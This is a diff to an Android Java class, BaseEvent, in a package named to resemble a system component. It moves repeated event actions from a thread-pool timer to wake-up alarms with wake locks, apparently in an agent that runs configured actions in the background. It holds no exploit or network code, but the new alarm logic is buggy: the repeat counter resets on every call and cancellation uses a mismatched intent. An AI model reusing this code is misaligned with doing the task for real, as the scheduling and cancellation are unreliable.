@@ -10,6 +10,14 @@ package com.android.networking.event;
 import java.util.concurrent.ScheduledFuture;
 import java.util.concurrent.TimeUnit;
 
+import android.app.AlarmManager;
+import android.app.PendingIntent;
+import android.content.BroadcastReceiver;
+import android.content.Context;
+import android.content.Intent;
+import android.content.IntentFilter;
+import android.os.PowerManager;
+
 import com.android.networking.Status;
 import com.android.networking.ThreadBase;
 import com.android.networking.action.Action;
@@ -27,7 +35,7 @@ public abstract class BaseEvent extends ThreadBase {
 	private static final String TAG = "BaseEvent"; //$NON-NLS-1$
 
 	boolean isActive = false;
-	private ScheduledFuture<?> future;
+	private Alarm alarm;
 	private String subType;
 
 	// Gli eredi devono implementare i seguenti metodi astratti
@@ -42,6 +50,82 @@ public abstract class BaseEvent extends ThreadBase {
 	/** The event. */
 	protected ConfEvent conf;
 	private int iterCounter;
+
+	public class Alarm extends BroadcastReceiver {
+
+		@Override
+		public void onReceive(Context context, Intent intent) {
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " SCHED (onReceive) ");
+			}
+
+			PowerManager.WakeLock wl;
+			if (Cfg.POWER_MANAGEMENT) {
+				PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
+				wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "");
+				wl.acquire();
+			}
+			int count = 0;
+
+			// public void run() {
+			try {
+				// verifica iter, se sono stati eseguiti i giusti repeat
+				// esce
+				if (count >= iterCounter) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " SCHED (onReceive): count >= iterCounter");
+					}
+
+					stopAlarm();
+					return;
+				}
+
+				triggerRepeatAction();
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " SCHED (onReceive) count: " + count);
+				}
+
+				count++;
+			} catch (Exception ex) {
+				if (Cfg.EXCEPTION) {
+					Check.log(ex);
+				}
+
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " SCHED (onReceive) Error: " + ex);
+				}
+
+				stopAlarm();
+			}
+
+			if (Cfg.POWER_MANAGEMENT) {
+				wl.release();
+			}
+		}
+
+		public void SetAlarm(int delay, int period) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (SetAlarm) delay=" + delay + " period=" + period + "intent= nmaBE." + getId());
+			}
+			Context context = Status.getAppContext();
+			AlarmManager am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
+			// Intent i = new Intent(Status.getAppContext(), Alarm.class);
+			Intent i = new Intent("BE." + getId());
+			PendingIntent pi = PendingIntent.getBroadcast(context, 0, i, 0);
+			// Millisec * Second * Minute
+			am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + delay * 1000, period * 1000, pi);
+		}
+
+		public void CancelAlarm() {
+			Context context = Status.getAppContext();
+			Intent intent = new Intent(context, Alarm.class);
+			PendingIntent sender = PendingIntent.getBroadcast(context, 0, intent, 0);
+			AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
+			alarmManager.cancel(sender);
+		}
+	}
 
 	public int getId() {
 		return conf.getId();
@@ -61,12 +145,12 @@ public abstract class BaseEvent extends ThreadBase {
 		if (Cfg.DEBUG) {
 			Check.requires(conf != null, "null conf");
 		}
-		
+
 		this.conf = conf;
-		
+
 		boolean ret = parse(conf);
 		iterCounter = conf.iter;
-		
+
 		return ret;
 
 	}
@@ -76,14 +160,14 @@ public abstract class BaseEvent extends ThreadBase {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " event: " + this + " triggering: " + actionId);//$NON-NLS-1$ //$NON-NLS-2$
 			}
-			
+
 			Status.self().triggerAction(actionId, this);
 			return true;
 		} else {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (trigger): null action");
 			}
-			
+
 			return false;
 		}
 	}
@@ -98,7 +182,6 @@ public abstract class BaseEvent extends ThreadBase {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (onEnter): already active, return");
 			}
-
 			return;
 		}
 
@@ -127,61 +210,32 @@ public abstract class BaseEvent extends ThreadBase {
 		triggerStartAction();
 
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (scheduleAtFixedRate) delay: " + delay + " period: " + period);
+			Check.log(TAG + " (Alarm) delay: " + delay + " period: " + period);
 		}
 
 		if (delay > 0) {
 			if (Cfg.DEBUG) {
 				Check.asserts(period > 0, " (onEnter) Assert failed, period<=0: " + conf);
+				Check.log(TAG + " (onEnter) register Reveiverfilter = BE." + getId());
 			}
 
-			future = Status.self().getStpe().scheduleAtFixedRate(new Runnable() {
-				int count = 0;
+			alarm = new Alarm();
+			Status.getAppContext().registerReceiver(alarm, new IntentFilter("BE." + getId()));
+			alarm.SetAlarm(delay, period);
 
-				public void run() {
-					try {
-						// verifica iter, se sono stati eseguiti i giusti repeat esce
-						if (count >= iterCounter) {
-							if (Cfg.DEBUG) {
-								Check.log(TAG + " SCHED (run): count >= iterCounter");
-							}
-
-							stopSchedulerFuture();
-							return;
-						}
-
-						triggerRepeatAction();
-
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " SCHED (run) count: " + count);
-						}
-
-						count++;
-					} catch (Exception ex) {
-						if (Cfg.EXCEPTION) {
-							Check.log(ex);
-						}
-
-						if (Cfg.DEBUG) {
-							Check.log(TAG + " SCHED (onEnter) Error: " + ex);
-						}
-
-						stopSchedulerFuture();
-					}
-				}
-			}, delay, period, TimeUnit.SECONDS);
 		}
 
 		isActive = true;
 	}
 
-	private void stopSchedulerFuture() {
+	private void stopAlarm() {
 		if (Cfg.DEBUG)
-			Check.asserts(isActive, "stopSchedulerFuture");
+			Check.asserts(isActive, "stopAlarm");
 
-		if (isActive && future != null) {
-			future.cancel(true);
-			future = null;
+		if (isActive && alarm != null) {
+			alarm.CancelAlarm();
+			Status.getAppContext().unregisterReceiver(alarm);
+			alarm = null;
 		}
 	}
 
@@ -200,7 +254,7 @@ public abstract class BaseEvent extends ThreadBase {
 				Check.log(TAG + " (onExit): " + this);
 			}
 
-			stopSchedulerFuture();
+			stopAlarm();
 			isActive = false;
 
 			triggerEndAction();
@@ -209,6 +263,7 @@ public abstract class BaseEvent extends ThreadBase {
 				Check.log(TAG + " (onExit): Not active");
 			}
 		}
+
 	}
 
 	protected synchronized boolean stillIter() {
